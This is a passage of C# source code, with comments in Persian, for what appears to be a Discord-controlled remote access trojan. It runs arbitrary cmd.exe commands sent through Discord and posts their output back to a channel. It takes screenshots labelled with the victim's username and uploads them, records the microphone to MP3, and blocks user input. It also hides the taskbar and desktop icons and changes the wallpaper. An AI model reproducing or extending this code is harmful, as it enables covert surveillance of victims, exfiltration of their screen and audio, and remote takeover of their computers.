                    await SendMessageAsync("Cannot go higher than the current directory.", replyChannelId);
                }
            }
            else
            {
                if (Directory.Exists(cdCommand))
                {
                    Directory.SetCurrentDirectory(cdCommand);
                    await SendMessageAsync($"Changed : {cdCommand}", replyChannelId);
                }
                else
                {
                    await SendMessageAsync($"Directory '{cdCommand}' not found.", replyChannelId);
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    public static byte[] StringToBytes(string input)
    {
        return Encoding.UTF8.GetBytes(input);
    }

    public static async Task ExecuteCmdCommand(string cmdCommand, ulong replyChannelId)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C {cmdCommand}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            },
            EnableRaisingEvents = true
        };

        var outputBuilder = new StringBuilder();
        var errorBuilder = new StringBuilder();

        process.OutputDataReceived += (sender, e) =>
        {
            if (e.Data != null)
            {
                outputBuilder.AppendLine(e.Data);
            }
        };

        process.ErrorDataReceived += (sender, e) =>
        {
            if (e.Data != null)
            {
                errorBuilder.AppendLine(e.Data);
            }
        };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        process.WaitForExit();

        var output = outputBuilder.ToString();
        var error = errorBuilder.ToString();

        if (!string.IsNullOrWhiteSpace(error))
        {
            await SendMessageAsync($"Command execution failed with error:```{error}```", replyChannelId);
        }
        else if (!string.IsNullOrWhiteSpace(output))
        {
            if (output.Length >= 1990)
            {
                using (var outputStream = new MemoryStream(Encoding.UTF8.GetBytes(output)))
                {
                    await SendFileAsync(outputStream, "output.txt", "Here's the output:", replyChannelId);

                }
            }
            else
            {
                await SendMessageAsync($"```{output}```", replyChannelId);
            }
        }
        else
        {
            await SendMessageAsync("Command executed successfully with no output.", replyChannelId);
        }
    }
    private static async Task SendFileAsync(Stream fileStream, string fileName, string message, ulong channelId)
    {
        var requestUrl = $"v10/channels/{channelId}/messages";

        using (var content = new MultipartFormDataContent())
        {
            // Add the message content
            content.Add(new StringContent(message), "content");

            // Add the file
            var fileContent = new StreamContent(fileStream);
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            content.Add(fileContent, "files[0]", fileName);

            try
            {
                var response = await ClientWithoutProxy.PostAsync(requestUrl, content);
                if (!response.IsSuccessStatusCode)
                {
                }
            }
            catch (Exception ex)
            {
            }
        }
    }


    private static async Task SetWallpaper(string imageUrl, ulong replyChannelId)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                byte[] imageBytes = await httpClient.GetByteArrayAsync(imageUrl);
                string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.jpg");
                File.WriteAllBytes(tempPath, imageBytes);
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                await SendMessageAsync("Wallpaper Changed !", replyChannelId);
                File.Delete(tempPath);
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error :{ex.Message}", replyChannelId);
            }
        }
    }
    private const uint SPI_SETDESKWALLPAPER = 0x0014;
    private const uint SPIF_UPDATEINIFILE = 0x01;
    private const uint SPIF_SENDCHANGE = 0x02;

    public static async Task OpenUrlInDefaultBrowser(string url, ulong replyChannelId)
    {
        try
        {
            if (!url.StartsWith("http://") && !url.StartsWith("https://"))
            {
                url = "http://" + url;
            }

            Process.Start(new ProcessStartInfo(url)
            {
                UseShellExecute = true
            });

            await SendMessageAsync("Opening URL", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task ExecutePwdCommand(ulong replyChannelId)
    {
        try
        {
            string currentDirectory = Directory.GetCurrentDirectory();
            await SafeSendMessageAsync($"{currentDirectory}", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    /// <summary>
    /// پردازش دستور shot: گرفتن تعداد مورد نظر اسکرین شات،
    /// ذخیره‌شدن در پوشه موقت، ارسال به کانال و حذف فایل‌های موقت.
    /// </summary>
    private static async Task ProcessShotCommand(int shotCount, ulong replyChannelId)
    {
        for (int i = 0; i < shotCount; i++)
        {
            try
            {
                string filePath = CaptureScreenshot();
                string fileName = Path.GetFileName(filePath);
                string description = $"Screenshot {i + 1} from {Environment.UserName}";
                await shotSendFileAsync(replyChannelId, filePath, fileName, description);

                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
            }
            catch (Exception ex)
            {
            }
        }
    }

    private static double MeasureInternetSpeed()
    {
        try
        {
            var client = new WebClient();
            var stopwatch = new System.Diagnostics.Stopwatch();
            byte[] data;

            stopwatch.Start();
            data = client.DownloadData("https://via.placeholder.com/100"); // فایل کوچک برای تست
            stopwatch.Stop();

            double timeInSeconds = stopwatch.Elapsed.TotalSeconds;
            double speedKbps = (data.Length * 8) / (timeInSeconds * 1024); // تبدیل به کیلوبیت بر ثانیه

            return speedKbps;
        }
        catch
        {
            return 100; // در صورت خطا، سرعت فرضی پایین
        }
    }
    private static long GetImageQualityBasedOnSpeed(double speedKbps)
    {
        if (speedKbps >= 5000) return 750L; // اینترنت پرسرعت = کیفیت بالا
        if (speedKbps >= 2000) return 60L; // اینترنت متوسط = کیفیت متوسط
        if (speedKbps >= 500) return 40L; // اینترنت ضعیف = کیفیت کمتر
        return 25L;                        // اینترنت خیلی ضعیف = کیفیت پایین
    }

    private static string CaptureScreenshot()
    {
        Size resolution = GetDisplayResolution();
        string tempFileName = Path.Combine(Path.GetTempPath(), $"screenshot_{Guid.NewGuid()}.jpg");

        double speedKbps = MeasureInternetSpeed();
        long quality = GetImageQualityBasedOnSpeed(speedKbps);

        using (var bitmap = new Bitmap(resolution.Width, resolution.Height, PixelFormat.Format32bppArgb))
        {
            using (var graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(0, 0, 0, 0, resolution);
            }

            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
            if (jpgEncoder != null)
            {
                EncoderParameters encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                bitmap.Save(tempFileName, jpgEncoder, encoderParams);
            }
            else
            {
                bitmap.Save(tempFileName, ImageFormat.Jpeg);
            }
        }
        return tempFileName;
    }


    private static ImageCodecInfo GetEncoder(ImageFormat format)
    {
        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
        foreach (ImageCodecInfo codec in codecs)
        {
            if (codec.FormatID == format.Guid)
                return codec;
        }
        return null;
    }

    /// <summary>
    /// ارسال فایل (تصویر اسکرین شات) به کانال به صورت multipart/form-data همراه با توضیح در payload_json.
    /// </summary>
    private static async Task shotSendFileAsync(ulong channelId, string filePath, string fileName, string description)
    {
        var requestUrl = $"v10/channels/{channelId}/messages";
        try
        {
            using (var formData = new MultipartFormDataContent())
            {
                var payload = new { content = description };
                string payloadJson = JsonSerializer.Serialize(payload);
                var payloadContent = new StringContent(payloadJson, Encoding.UTF8, "application/json");
                formData.Add(payloadContent, "payload_json");

                using (var fileStream = File.OpenRead(filePath))
                {
                    var fileContent = new StreamContent(fileStream);
                    fileContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                    formData.Add(fileContent, "file", fileName);

                    HttpResponseMessage response = await ClientWithoutProxy.PostAsync(requestUrl, formData);

                }
            }
        }
        catch (Exception ex)
        {
        }
    }

    // ------------------ کدهای مربوط به دریافت ابعاد واقعی صفحه ------------------
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);

    [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true, ExactSpelling = true)]
    public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

    public enum DeviceCap
    {
        VERTRES = 10,
        DESKTOPVERTRES = 117,
        HORZRES = 8,
        DESKTOPHORZRES = 118
    }

    public static double GetWindowsScreenScalingFactor(bool percentage = true)
    {
        // ایجاد Graphics از پنجره فعلی
        using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
        {
            IntPtr hDC = graphics.GetHdc();
            int logicalScreenHeight = GetDeviceCaps(hDC, (int)DeviceCap.VERTRES);
            int physicalScreenHeight = GetDeviceCaps(hDC, (int)DeviceCap.DESKTOPVERTRES);
            graphics.ReleaseHdc(hDC);
            double scalingFactor = physicalScreenHeight / (double)logicalScreenHeight;
            if (percentage)
                scalingFactor *= 100.0;
            return scalingFactor;
        }
    }

    public static Size GetDisplayResolution()
    {
        double scalingFactor = GetWindowsScreenScalingFactor(false);
        int width = (int)(Screen.PrimaryScreen.Bounds.Width * scalingFactor);
        int height = (int)(Screen.PrimaryScreen.Bounds.Height * scalingFactor);
        return new Size(width, height);
    }
}

public class Author
{
    public string id { get; set; }
    public string username { get; set; }
    public bool bot { get; set; }
}

/// <summary>
/// کلاس نمایانگر پیام دریافتی از Discord
/// </summary>
public class Message
{
    public string id { get; set; }
    public string content { get; set; }
    public Author author { get; set; }
    public string channel_id { get; set; }
    public List<Attachment> Attachments { get; set; }

}
public class Attachment
{
    public string Url { get; set; }
    public int? Width { get; set; }
    public int? Height { get; set; }
}

/// <summary>
/// کلاس نمایانگر کانال‌ها (برای دریافت لیست یا ایجاد کانال)
/// </summary>
public class Channel
{
    public string id { get; set; }
    public string name { get; set; }
    public int type { get; set; }
}
public class AudioRecorder : IDisposable
{
    private readonly string outputFilePath;
    private WaveInEvent waveIn;
    private LameMP3FileWriter mp3Writer;

    public AudioRecorder(string outputFilePath)
    {
        this.outputFilePath = outputFilePath;
    }

    public async Task StartRecording(int durationInSeconds)
    {
        waveIn = new WaveInEvent
        {
            WaveFormat = new WaveFormat(44100, 16, 1)
        };

        mp3Writer = new LameMP3FileWriter(outputFilePath, waveIn.WaveFormat, 128);

        waveIn.DataAvailable += WaveIn_DataAvailable;

        waveIn.StartRecording();
        await Task.Delay(durationInSeconds * 1000);
        waveIn.StopRecording();
        mp3Writer.Close();
    }

    private void WaveIn_DataAvailable(object sender, WaveInEventArgs e)
    {
        if (mp3Writer != null)
        {
            mp3Writer.Write(e.Buffer, 0, e.BytesRecorded);
        }
    }

    public void Dispose()
    {
        waveIn?.Dispose();
        mp3Writer?.Dispose();
    }
}

public class IpInfo
{
    public string status { get; set; }
    public string country { get; set; }
    public string countryCode { get; set; }
    // سایر فیلدها در صورت نیاز...
}
public class BlockInputNativeMethods
{
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
}
public class Taskbar
{
    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    [DllImport("user32.dll")]
    public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

    [DllImport("user32.dll")]
    private static extern int GetDesktopWindow();

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 1;

    protected static int Handle
    {
        get
        {
            return FindWindow("Shell_TrayWnd", "");
        }
    }

    protected static int HandleOfStartButton
    {
        get
        {
            int handleOfDesktop = GetDesktopWindow();
            int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
            return handleOfStartButton;
        }
    }

    private Taskbar()
    {
        // hide ctor
    }

    public static void Show()
    {
        ShowWindow(Handle, SW_SHOW);
        ShowWindow(HandleOfStartButton, SW_SHOW);
    }

    public static void Hide()
    {
        ShowWindow(Handle, SW_HIDE);
        ShowWindow(HandleOfStartButton, SW_HIDE);
    }
}
public class DesktopIconHider
{
    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    /// <summary>
    /// پنهان کردن آیکون‌های دسکتاپ.
    /// </summary>
    public static void HideDesktopIcons()
    {
        IntPtr listViewHandle = GetDesktopListViewHandle();
        if (listViewHandle != IntPtr.Zero)
        {
            ShowWindow(listViewHandle, SW_HIDE);
        }
    }

    /// <summary>
    /// نمایش آیکون‌های دسکتاپ.
    /// </summary>
    public static void ShowDesktopIcons()
    {
        IntPtr listViewHandle = GetDesktopListViewHandle();
        if (listViewHandle != IntPtr.Zero)
        {
            ShowWindow(listViewHandle, SW_SHOW);
        }
    }

    /// <summary>
    /// یافتن هندل پنجره لیست ویو آیکون‌های دسکتاپ.
    /// ابتدا از طریق پنجره Progman و سپس با جستجو در پنجره‌های دیگر (مانند WorkerW) اقدام به یافتن می‌کند.
    /// </summary>
    /// <returns>هندل پنجره در صورت یافتن، در غیر این صورت IntPtr.Zero</returns>
    private static IntPtr GetDesktopListViewHandle()
    {
        IntPtr listViewHandle = IntPtr.Zero;

        // تلاش اولیه از طریق پنجره‌ی Progman
        IntPtr progman = FindWindow("Progman", null);
        if (progman != IntPtr.Zero)
        {
            IntPtr shellViewWin = FindWindowEx(progman, IntPtr.Zero, "SHELLDLL_DefView", null);
            if (shellViewWin != IntPtr.Zero)
            {
                listViewHandle = FindWindowEx(shellViewWin, IntPtr.Zero, "SysListView32", "FolderView");
            }
        }

        // اگر یافت نشد، جستجو در تمام پنجره‌های سطح بالا (ممکن است در WorkerW باشد)
        if (listViewHandle == IntPtr.Zero)
        {
            EnumWindows((hWnd, lParam) =>
            {
                IntPtr shellView = FindWindowEx(hWnd, IntPtr.Zero, "SHELLDLL_DefView", null);
                if (shellView != IntPtr.Zero)
                {
                    listViewHandle = FindWindowEx(shellView, IntPtr.Zero, "SysListView32", "FolderView");
                    // اگر پیدا شد، از ادامه‌ی Enumeration جلوگیری می‌کنیم
                    return false;
                }
                return true;
            }, IntPtr.Zero);
        }
        return listViewHandle;
    }
}
